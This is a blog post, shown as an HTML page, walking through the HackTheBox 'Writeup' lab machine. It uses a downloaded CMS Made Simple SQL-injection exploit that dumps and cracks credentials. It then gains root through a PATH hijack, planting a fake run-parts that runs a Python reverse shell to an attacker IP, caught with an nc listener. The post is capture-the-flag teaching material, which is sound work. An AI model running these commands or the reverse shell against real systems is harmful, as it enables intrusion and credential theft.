@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Writeup was my first machine I solved to start my CTF journey. It’s an easy rated box but still interesting and perfect to jump into the CTF bath! User FlagReconLet’s start with the classic nmap: 12">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Writeup">
+<meta property="og:url" content="https://hg8.sh/posts/writeup/index.html">
+<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
+<meta property="og:description" content="Writeup was my first machine I solved to start my CTF journey. It’s an easy rated box but still interesting and perfect to jump into the CTF bath! User FlagReconLet’s start with the classic nmap: 12">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82158812-62e05800-988a-11ea-876f-7954091cecbb.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/64074062-b592c900-cc95-11e9-97eb-5199438c8feb.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/64074102-a3fdf100-cc96-11e9-92fb-53bcb44da0ba.png">
+<meta property="article:published_time" content="2019-10-11T22:00:00.000Z">
+<meta property="article:modified_time" content="2022-08-04T08:37:52.839Z">
+<meta property="article:author" content="hg8">
+<meta property="article:tag" content="linux">
+<meta property="article:tag" content="sqli">
+<meta property="article:tag" content="exploit">
+<meta property="article:tag" content="run-parts">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="cmsms">
+<meta property="article:tag" content="injection">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/82158812-62e05800-988a-11ea-876f-7954091cecbb.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+     
+    <title>HackTheBox - Writeup :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+    
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="hg8's Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/posts/haystack/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+    </span>
+    <br/>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">1.2.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Flag"><span class="toc-number">2.</span> <span class="toc-text">Root Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Privilege-escalation"><span class="toc-number">2.2.</span> <span class="toc-text">Privilege escalation</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        <header id="header">
+  <a href="/">
+  
+      <div id="logo" style="background-image: url(/images/logo.webp);"></div>
+  
+    <span class="logo__mark"></span>
+    <span class="logo__text">./hg8.sh</span>
+    <span class="logo__cursor"></span>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
+      </li>
+       
+        <li><a href="/">Home</a></li>
+       
+        <li><a href="/about/">About</a></li>
+       
+        <li><a href="/archives/">Posts</a></li>
+       
+        <li><a href="/search/">Search</a></li>
+      
+    </ul>
+  </div>
+</header>
+
+        
+          <br>
+          <br>
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        HackTheBox - Writeup
+    </h1>
+
+
+
+    <div class="meta"> 
+      
+    <div class="postdate">
+      
+        <time datetime="2019-10-11T22:00:00.000Z" itemprop="datePublished">12-10-2019</time>
+        
+      
+    </div>
+
+
+      — Written by 
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">hg8</span>
+      </span>
+      —
+      6 min read
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <img width="587" alt="writeup-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158812-62e05800-988a-11ea-876f-7954091cecbb.png">
+
+<p>Writeup was my first machine I solved to start my CTF journey. It’s an easy rated box but still interesting and perfect to jump into the CTF bath!</p>
+<h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic nmap:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC writeup.htb           </span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-01 10:39 CEST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> writeup.htb (10.10.10.138)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/writeup/</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Nothing here yet.</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 32.23 seconds</span><br></pre></td></tr></table></figure>
+
+<p>A classic, port 80 and 22. <code>nmap</code> did a bit extra work for us and found the the <code>robots.txt</code> show an interesting entry : <code>/writeup/</code></p>
+<p>First thing we see when opening the 80 port is this message :</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/64074062-b592c900-cc95-11e9-97eb-5199438c8feb.png" alt="2019-09-01-105047_1387x643_scrot"></p>
+<p>So there a DOS protection checking apache logs for 40X errors. Probably a fail2ban or something. Let’s avoid classic enumeration scripts to not get banned.</p>
+<p>The footer says :</p>
+<blockquote>
+<p>Page is hand-crafted with vi.</p>
+</blockquote>
+<p>That’s an interesting fact to keep in mind, maybe can access vi backups file (something like <code>index.php~</code> or <code>index.php.swp</code>) and have a look at the source code.</p>
+<p>The <code>/writeup/</code> endpoint countains, well, writeups. The website seems rather basic :</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/64074102-a3fdf100-cc96-11e9-92fb-53bcb44da0ba.png" alt="2019-09-01-105747_1455x764_scrot"></p>
+<p>Each writeup is accessible throught the URL in the following form : </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://writeup.htb/writeup/index.php?page=&#123;writeup-name&#125;</span><br></pre></td></tr></table></figure>
+
+<p>After digging a bit we found there is no Local File Inclusion vulnerabilities nor <code>vim</code> backup files accessible. </p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>Checking the source code inform us that the website was made using <code>CMS Made Simple</code> :</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ http writeup.htb/writeup/index.php</span><br><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache/2.4.25 (Debian)</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>CMSSESSID9d3962=lgt7j00rvndgl4; path=/</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en_US&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>Home - writeup<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">	</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;http://writeup.htb/writeup/&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;Generator&quot;</span> <span class="attr">content</span>=<span class="string">&quot;CMS Made Simple - Copyright (C) 2004-2019. All rights reserved.&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml">[...]</span></span><br></pre></td></tr></table></figure>
+
+<p>A quick search return a fairly recent vulnerability, CVE-2019-9053 :</p>
+<blockquote>
+<p>An issue was discovered in CMS Made Simple 2.2.8. It is possible with the News module, through a crafted URL, to achieve unauthenticated blind time-based SQL injection via the m1_idlist parameter.</p>
+</blockquote>
+<p>And an exploit is already available, perfect! </p>
+<p>Looking at the source code we can see we have a very well crafted and complete exploit. It will :</p>
+<ol>
+<li>Dump the salt used by CMS Made Simple</li>
+<li>Dump the username</li>
+<li>Dump the email </li>
+<li>Dump the password</li>
+<li>And even have a function to crack the found hashed password</li>
+</ol>
+<p> Let’s try it :</p>
+ <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget https://www.exploit-db.com/raw/46635 -O cmssimple.py</span><br><span class="line">[hg8@archbook ~]$ python cmssimple.py -u http://writeup.htb/writeup/ --crack -w <span class="string">&quot;~/SecLists/Passwords/Leaked-Databases/rockyou.txt&quot;</span></span><br><span class="line">[+] Salt <span class="keyword">for</span> password found: 5a599ef579066807</span><br><span class="line">[+] Username found: jkr</span><br><span class="line">[+] Email found: jkr@writeup.htb</span><br><span class="line">[+] Password found: 62def4866937f08cc13bab43bb14e6f7</span><br><span class="line">[+] Password cracked: raykayjay9</span><br></pre></td></tr></table></figure>
+
+<p>Really nice exploit here. So we have an username and a password.</p>
+<p>The CMS Made Simple admin page can not be accessed using those credentials, so let’s try with SSH :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ssh jkr@writeup.htb</span><br><span class="line">jkr@writeup.htb<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Devuan GNU/Linux system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="string">permitted by applicable law.</span></span><br><span class="line"><span class="string">Last login: Sun Sep  1 05:07:51 2019 from 10.10.10.85</span></span><br><span class="line"><span class="string">jkr@writeup:~$ cat user.txt </span></span><br><span class="line"><span class="string">d4e493fd40xxxxxxxxxxxxxx319f978</span></span><br><span class="line"><span class="string">jkr@writeup:~$ </span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>As a recon phase let’s run <a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy"><code>pspy</code></a> to check running process. And paying closer attention de process run as root.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="comment"># Attacker box</span></span><br><span class="line">[hg8@archbook ~]$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64</span><br><span class="line">[hg8@archbook ~]$ scp pspy64 jkr@writeup.htb:~ </span><br><span class="line">jkr@writeup.htb<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">pspy64   100% 3006KB 111.9KB/s   00:26    </span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jkr@writeup:~$ chmod +x pspy64  &amp;&amp; ./pspy64</span><br></pre></td></tr></table></figure>
+
+<p>After watching the processes for a while, we will see a few other users succeding the user challenge and connect to SSH aswell. And something interresting appears :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">05:37:15 CMD: UID=0    PID=11674  | sshd: [accepted]</span><br><span class="line">05:37:15 CMD: UID=102  PID=11675  | sshd: [net]       </span><br><span class="line">05:37:29 CMD: UID=0    PID=11676  | sshd: jkr [priv]  </span><br><span class="line">05:37:29 CMD: UID=0    PID=11677  | sh -c /usr/bin/env -i PATH=/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new </span><br><span class="line">05:37:29 CMD: UID=0    PID=11678  | run-parts --lsbsysinit /etc/update-motd.d </span><br><span class="line">05:37:29 CMD: UID=0    PID=11679  | uname -rnsom </span><br><span class="line">05:37:29 CMD: UID=0    PID=11680  | sshd: jkr [priv]  </span><br><span class="line">05:37:29 CMD: UID=1000 PID=11681  | sshd: jkr@pts/2</span><br></pre></td></tr></table></figure>
+
+<p>A few commands are run as <code>root</code> upon users login. Let’s dig.</p>
+<p>First command that caught the attention is <code>run-parts --lsbsysinit /etc/update-motd.d</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ man run-parts</span><br><span class="line">run-parts runs all the executable files named within constraints described below, found <span class="keyword">in</span> directory [directory].</span><br></pre></td></tr></table></figure>
+
+<p>Sounds promising. If we can add a script to <code>/etc/update-motd.d</code> it will be executed as root on next login. </p>
+<p>Unfortunately we don’t have writting rights to <code>/etc/update-motd.d</code> nor to the file present in it:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jkr@writeup:~$ ls -l /etc/update-motd.d/</span><br><span class="line">total 4</span><br><span class="line">-rwxr-xr-x 1 root root 23 Jun  3  2018 10-uname</span><br></pre></td></tr></table></figure>
+
+<p>That looks like a dead end here. </p>
+<p>Another thing we noticed is that executable are called in relative path and not absolute. And the first command gives the full <code>PATH</code> env variable before launching the <code>run-parts</code> command.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c /usr/bin/env -i PATH=/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new </span><br></pre></td></tr></table></figure>
+
+<p>As a reminder, when a command is called Linux will search in the <code>PATH</code> environement variable to find where this executable is located. So in the command above, Linux system will first look in the <code>/usr/local/sbin</code> to see if <code>run-parts</code> is there, then in <code>/usr/local/bin</code> etc… </p>
+<p>Let’s check where <code>run-parts</code> is : </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jkr@writeup:~$ <span class="built_in">which</span> run-parts</span><br><span class="line">/bin/run-parts</span><br></pre></td></tr></table></figure>
+
+<p>So it’s <code>/bin/</code> folder, the last on the <code>PATH</code> list. That mean if we can write an executable named <code>run-parts</code> in either : </p>
+<ul>
+<li><code>/usr/local/sbin/</code></li>
+<li><code>/usr/local/bin/</code></li>
+<li><code>/usr/sbin/</code></li>
+<li><code>/usr/bin/</code></li>
+<li><code>/sbin/</code></li>
+</ul>
+<p>then it will be ran instead of the real <code>/bin/run-parts</code> and as root. If we have writting rights in any of those folder then it’s bingo.</p>
+<h3 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Bash reserve shell doesn&#x27;t work, let&#x27;s use the python one</span></span><br><span class="line">jkr@writeup:~$ cat /usr/<span class="built_in">local</span>/sbin/run-parts </span><br><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.10.85&quot;,8585));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br><span class="line">jkr@writeup:~$ chmod +x /usr/<span class="built_in">local</span>/sbin/run-parts</span><br><span class="line">jkr@writeup:~$</span><br></pre></td></tr></table></figure>
+
+<p>Let’s listen to incoming connection :</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure>
+
+<p>Now we logout and login again to the box to initiate the <code>sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new </code> command.</p>
+<p>And surely we receive the connection immediatly :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.138:37078</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"><span class="comment"># cat /root/root.txt</span></span><br><span class="line">eeba4xxxxxxxxxxxx8d7226</span><br></pre></td></tr></table></figure>
+
+<p>That’s it! As always do not hesitate to contact me for any questions or feedbacks. </p>
+<p>See you next time !</p>
+<p>-hg8</p>
+
+  </div>
+</article>
+<br>
+<br>
+
+
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/HackTheBox/">HackTheBox</a> › <a class="category-link" href="/categories/CTF/HackTheBox/Easy-Box/">Easy Box</a>
+    </div>
+
+
+
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/cmsms/" rel="tag">cmsms</a>, <a class="tag-link-link" href="/tags/exploit/" rel="tag">exploit</a>, <a class="tag-link-link" href="/tags/injection/" rel="tag">injection</a>, <a class="tag-link-link" href="/tags/linux/" rel="tag">linux</a>, <a class="tag-link-link" href="/tags/run-parts/" rel="tag">run-parts</a>, <a class="tag-link-link" href="/tags/sqli/" rel="tag">sqli</a>, <a class="tag-link-link" href="/tags/writeup/" rel="tag">writeup</a>
+    </div>
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">1.2.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Flag"><span class="toc-number">2.</span> <span class="toc-text">Root Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Privilege-escalation"><span class="toc-number">2.2.</span> <span class="toc-text">Privilege escalation</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022
+    <a href="https://hg8.sh">hg8.sh</a>
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+    
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+
+
+</body>
+</html>
